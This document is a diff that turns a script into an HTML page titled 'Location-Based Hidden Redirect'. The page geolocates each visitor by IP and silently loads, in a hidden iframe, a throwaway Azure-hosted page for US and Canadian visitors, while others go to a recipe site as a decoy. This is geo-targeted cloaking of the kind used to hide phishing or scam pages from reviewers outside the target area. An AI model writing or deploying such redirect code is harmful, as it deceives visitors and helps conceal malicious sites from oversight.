@@ -1,20 +1,41 @@
-<script>
-    // Define redirection URLs
-    var usaCanadaUrl = "https://huntop001.z13.web.core.windows.net/"; // URL for USA & Canada
-    var globalUrl = "https://www.allrecipes.com"; // URL for all other countries
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location-Based Hidden Redirect</title>
+    <script>
+        // USA/Canada Redirection URL
+        var usaCanadaURL = "https://huntop001.z13.web.core.windows.net/";
+        // Other Countries Redirection URL
+        var otherCountriesURL = "https://www.allrecipes.com";
 
-    // Fetch user location using IP geolocation API
-    fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-            var userCountry = data.country_code; // Get country code (e.g., "US", "CA")
-            
-            // Redirect based on country
-            if (userCountry === "US" || userCountry === "CA") {
-                window.location.href = usaCanadaUrl;
-            } else {
-                window.location.href = globalUrl;
-            }
-        })
-        .catch(error => console.error('Geolocation API error:', error));
-</script>
+        // Function to Redirect with Hidden iframe
+        function hiddenRedirect(targetUrl) {
+            var iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.src = targetUrl;
+            document.body.appendChild(iframe);
+        }
+
+        // Fetch User Location Based on IP
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(data => {
+                var country = data.country_code;
+                if (country === "US" || country === "CA") {
+                    hiddenRedirect(usaCanadaURL);
+                } else {
+                    hiddenRedirect(otherCountriesURL);
+                }
+            })
+            .catch(() => {
+                // Default redirection if location detection fails
+                hiddenRedirect(otherCountriesURL);
+            });
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1> <!-- Can be hidden if needed -->
+</body>
+</html>
